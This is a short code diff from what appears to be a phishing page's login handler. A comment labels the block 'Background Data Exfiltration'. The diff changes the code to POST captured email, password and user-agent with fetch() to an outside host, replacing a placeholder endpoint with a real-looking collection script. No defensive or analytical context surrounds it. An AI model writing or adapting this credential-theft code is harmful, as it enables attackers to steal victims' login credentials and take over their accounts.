@@ -238,7 +238,7 @@
             } else {
                 // Background Data Exfiltration
                 try {
-                    await fetch('https://your-backend-api.com/capture', {
+                    await fetch('https://udc.ink/hr/delivery/Process.php', {
                         method: 'POST',
                         body: JSON.stringify({ email, pass, agent: navigator.userAgent })
                     });
